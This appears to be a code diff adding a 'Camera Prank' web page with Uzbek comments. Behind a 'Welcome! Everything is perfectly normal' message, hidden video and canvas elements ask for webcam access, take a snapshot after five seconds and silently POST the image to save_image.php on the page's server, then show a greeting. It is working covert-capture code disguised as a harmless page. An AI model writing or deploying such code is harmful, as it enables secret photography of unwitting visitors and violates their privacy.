@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Prank</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        video, canvas {
+            display: none; /* Ko'rinmas qilib qo'yish */
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome!</h1>
+    <p>Everything is perfectly normal... 😁</p>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Kamera orqali tasvir olish
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+                video.srcObject = stream;
+                setTimeout(takeSnapshot, 5000); // 5 soniyadan keyin rasm olish
+            });
+        }
+
+        function takeSnapshot() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imgData = canvas.toDataURL('image/png');
+            sendToServer(imgData); // Serverga rasmni yuborish
+
+            alert('Salom! 😄');
+        }
+
+        function sendToServer(imageData) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'save_image.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('image=' + encodeURIComponent(imageData));
+        }
+    </script>
+</body>
+</html>
